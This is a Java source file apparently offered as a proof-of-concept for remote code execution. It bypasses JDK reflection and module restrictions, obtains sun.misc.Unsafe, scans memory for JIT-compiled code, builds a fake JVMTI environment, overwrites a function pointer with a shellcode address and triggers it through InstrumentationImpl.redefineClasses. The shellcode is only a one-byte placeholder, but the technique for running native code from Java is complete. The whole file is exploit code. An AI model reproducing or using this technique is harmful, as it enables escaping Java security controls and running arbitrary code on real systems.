import sun.misc.Unsafe;

import java.lang.instrument.ClassDefinition;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class PocForRCE {
    public static void main(String [] args) throws Throwable {
        new JdkSecurityBypass().bypassReflectionFilter();
        //绕过Jdk Module访问限制 可以访问任意类(即使是未声明导出) 任意私有方法
        new JdkSecurityBypass().bypassModule();

        byte buf[] = new byte[]
                {(byte) 0xfc};

        Unsafe unsafe = null;

        try {
            Field field = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (sun.misc.Unsafe) field.get(null);

        } catch (Exception e) {
            throw new AssertionError(e);
        }


        long size = buf.length+0x178; // a long is 64 bits (http://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html)
        long allocateMemory = unsafe.allocateMemory(size);
        System.out.println("allocateMemory:"+Long.toHexString(allocateMemory));

        Map map=new HashMap();
        map.put("X","y");
        //unsafe.putObject(map,allocateMemory+0x10,ints);
        //unsafe.putByte(allocateMemory,);
        PocForRCE poc=new PocForRCE();
        for (int i=0;i<10000;i++)
        {
            poc.b(33);
        }
        Thread.sleep(2000);
        for (int k=0;k<10000;k++)
        {
            long tmp=unsafe.allocateMemory(0x4000);
            //unsafe.putLong(tmp+0x3900,tmp);
            //System.out.println("alloce:"+Long.toHexString(tmp));
        }

        long shellcodeBed = 0;
        int offset=4;
        for (int j=-0x1000;j<0x1000;j++)  //down search
        {

            long target=unsafe.getAddress(allocateMemory+j*offset);
            System.out.println("start get "+Long.toHexString(allocateMemory+j*offset)+",adress:"+Long.toHexString(target)+",now j is :"+j);
            if (target%8>0)
            {
                continue;
            }
            if (target>(allocateMemory&0xffffffff00000000l)&&target<(allocateMemory|0xffffffl))
            {

                if ((target&0xffffffffff000000l)==(allocateMemory&0xffffffffff000000l))
                {
                    continue;
                }
                if (Long.toHexString(target).indexOf("000000")>0||Long.toHexString(target).endsWith("bebeb0")||Long.toHexString(target).endsWith("abebeb"))
                {
                    System.out.println("maybe error address,skip "+Long.toHexString(target));
                    continue;
                }
                System.out.println("BYTE:"+unsafe.getByte(target));
                //System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j));
                if (unsafe.getByte(target)==0X55||unsafe.getByte(target)==0XE8||unsafe.getByte(target)==(byte)0xA0||unsafe.getByte(target)==0x48||unsafe.getByte(target)==(byte)0x66)
                {
                    System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j*offset)+",BYTE:"+Long.toHexString(unsafe.getByte(target)));
                    shellcodeBed=target;
                    break;
                }


            }

        }

        if (shellcodeBed==0)
        {
            for (int j=-0x100;j<0x800;j++)  //down search
            {

                long target=unsafe.getAddress(allocateMemory+j*offset);
                System.out.println("start get "+Long.toHexString(allocateMemory+j*offset)+",adress:"+Long.toHexString(target)+",now j is :"+j);
                if (target%8>0)
                {
                    continue;
                }
                if (target>(allocateMemory&0xffffffff00000000l)&&target<(allocateMemory|0xffffffffl))
                {

                    if ((target&0xffffffffff000000l)==(allocateMemory&0xffffffffff000000l))
                    {
                        continue;
                    }
                    if (Long.toHexString(target).indexOf("0000000")>0||Long.toHexString(target).endsWith("bebeb0")||Long.toHexString(target).endsWith("abebeb"))
                    {
                        System.out.println("maybe error address,skip "+Long.toHexString(target));
                        continue;
                    }
                    System.out.println("BYTE:"+unsafe.getByte(target));
                    //System.out.println("get address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j));
                    if (unsafe.getByte(target)==0X55||unsafe.getByte(target)==0XE8||unsafe.getByte(target)==(byte)0xA0||unsafe.getByte(target)==0x48)
                    {
                        System.out.println("get bigger cache address:"+Long.toHexString(target)+",at :"+Long.toHexString(allocateMemory-j*offset)+",BYTE:"+Long.toHexString(unsafe.getByte(target)));
                        shellcodeBed=target;
                        break;
                    }

                }

            }
        }
        System.out.println("find address end,address is "+Long.toHexString(shellcodeBed)+" mod 8 is:"+shellcodeBed%8);


        String address="";

        allocateMemory=shellcodeBed;
        address=allocateMemory+"";
        Class cls=Class.forName("sun.instrument.InstrumentationImpl");

        Constructor constructor=cls.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Object obj=constructor.newInstance(Long.parseLong(address),true,true);
        Method redefineMethod=cls.getMethod("redefineClasses",new Class[]{ClassDefinition[].class});
        ClassDefinition classDefinition=new ClassDefinition(
                Class.class,
                new byte[]{});
        ClassDefinition[] classDefinitions=new ClassDefinition[]{classDefinition};
        try
        {
            unsafe.putLong(allocateMemory+8,allocateMemory+0x10);  //set **jvmtienv point to it's next memory region
            unsafe.putLong(allocateMemory+8+8,allocateMemory+0x10); //set *jvmtienv point to itself
            unsafe.putLong(allocateMemory+0x10+0x168,allocateMemory+0x10+0x168+8); //overwrite allocate function pointer  to allocateMemory+0x10+0x168+8
            for (int k=0;k<buf.length;k++)
            {
                unsafe.putByte(allocateMemory+0x10+0x168+8+k,buf[k]); //write shellcode to allocate function body
            }
            redefineMethod.invoke(obj,new Object[]{classDefinitions});  //trigger allocate
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }

    }
    private int a(int x)
    {
        if (x>1)
        {
            // System.out.println("x>1");
        }
        else
        {
            // System.out.println("x<=1");
        }
        return x*1;
    }
    private void b(int x)
    {
        if (a(x)>1)
        {
            //System.out.println("x>1");
            this.a(x);
        }
        else
        {
            this.a(x+4);
            // System.out.println("x<=1");
        }
    }
}
